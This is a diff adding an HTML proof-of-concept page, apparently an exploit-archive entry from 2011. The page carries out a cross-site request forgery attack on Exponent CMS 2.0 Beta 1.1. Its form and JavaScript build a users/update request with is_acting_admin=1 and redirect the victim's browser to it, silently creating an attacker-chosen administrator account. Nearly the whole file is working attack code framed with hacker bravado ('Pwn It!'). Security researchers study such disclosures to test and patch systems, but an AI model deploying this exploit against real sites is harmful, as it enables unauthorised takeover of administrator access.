@@ -1,0 +1,111 @@
+<!--
+ 
+[+] Title: Exponent CMS 2.0 Beta 1.1 CSRF Add Administrator Account PoC
+[+] Version: 2.0 Beta 1.1 (not tested with older versions)
+[+] Note: No need administrator to be logged (:
+[+] Tested on: Linux Ubuntu 11.04 (Google Chrome) but will work in any other OS
+[+] Download URL: https://github.com/downloads/exponentcms/exponent-cms/exponent-2.0.0-beta1.1.zip
+[+] Date: 02.05.2011
+[+] Author: outlaw.dll
+
+GreetZ to all bitcheZ in the world! =P
+W_o.O_W
+ 
+-->
+<html>
+    <head>
+        <title>Exponent CMS 2.0 Beta 1.1 CSRF Add Administrator Account PoC by outlaw.dll</title>
+        <style type="text/css">
+        body, table, tr, td 
+        {
+            background-color: #00489C;
+            font-family: Verdana;
+            font-size: 16px;
+            color: #FFFFFF;
+        }
+        </style>
+    </head>
+    <body>
+        <pre>
+              .-""""-.       .-""""-.             
+             /        \     /        \
+            /_        _\   /_        _\
+           // \      / \\ // \      / \\
+           |\__\    /__/| |\__\    /__/|
+            \    ||    /   \    ||    /
+             \        /     \        /
+              \  __  /       \  __  /
+      .-""""-. '.__.'.-""""-. '.__.'.-""""-.
+     /        \ |  |/        \ |  |/        \
+    /_        _\|  /_        _\|  /_        _\
+   // \      / \\ // \      / \\ // \      / \\
+   |\__\    /__/| |\__\    /__/| |\__\    /__/|
+    \    ||    /   \    ||    /   \    ||    /
+     \        /     \        /     \        /
+      \  __  /       \  __  /       \  __  /
+       '.__.'         '.__.'         '.__.'
+        |  |           |  |           |  |
+        |  |           |  |           |  |  
+        </pre>
+        Exponent CMS 2.0 Beta 1.1 CSRF Add Administrator Account PoC by outlaw.dll
+        <br /><br />
+        <form name="exploit">
+            <table border="0">
+                <tr>
+                    <td width="150" align="right">Target URL:</td>
+                    <td width="400"><input type="text" name="targetURL" value="http://localhost/exponent/index.php" size="30" /></td>
+                </tr>
+                <tr>
+                    <td width="150" align="right">Username:</td>
+                    <td width="400"><input type="text" name="username" value="pwned" size="30" /></td>
+                </tr>
+                <tr>
+                    <td width="150" align="right">Password:</td>
+                    <td width="400"><input type="text" name="password" value="1337" size="30" /></td>
+                </tr>
+                <tr>
+                    <td width="150" align="right">E-M@il:</td>
+                    <td width="400"><input type="text" name="email" value="root@pwned.cx" size="30" /></td>
+                </tr>
+                <tr>
+                    <td width="150" align="right">First Name:</td>
+                    <td width="400"><input type="text" name="firstname" value="Greatest" size="30" /></td>
+                </tr>
+                <tr>
+                    <td width="150" align="right">Last Name:</td>
+                    <td width="400"><input type="text" name="lastname" value="Ever" size="30" /></td>
+                </tr>
+                <tr>
+                    <td width="150" align="right">Admin Permissions:</td>
+                    <td width="400"><input type="checkbox" name="isAdmin" checked="yes" value="1" /></td>
+                </tr>
+                <tr>
+                    <td width="150"></td>
+                    <td width="400"><input type="button" value="Pwn It!" onClick="runExploit()" /></td>
+                </tr>
+            </table>
+        </form>
+        <script type="text/javascript">
+            function runExploit()
+            {
+                var targetURL = exploit.targetURL.value;
+                var username = exploit.username.value;
+                var password = exploit.password.value;
+                var email = exploit.email.value;
+                var firstname = exploit.firstname.value;
+                var lastname = exploit.lastname.value;
+                var isAdmin = exploit.isAdmin.value;
+                
+                if (targetURL != "" && username != "" && password != "" && email != "" && firstname != "" && lastname != "" && isAdmin != "")
+                {
+                    var exploitURL = targetURL + "?module=users&action=update&username="+username+"&pass1="+password+"&pass2="+password+"&email="+email+"&firstname="+firstname+"&lastname="+lastname+"&is_acting_admin="+isAdmin;
+                    location.replace(exploitURL);
+                }
+                else
+                {
+                    alert("Error! Empty form fields.");
+                }
+            }
+        </script>
+    </body>
+</html>
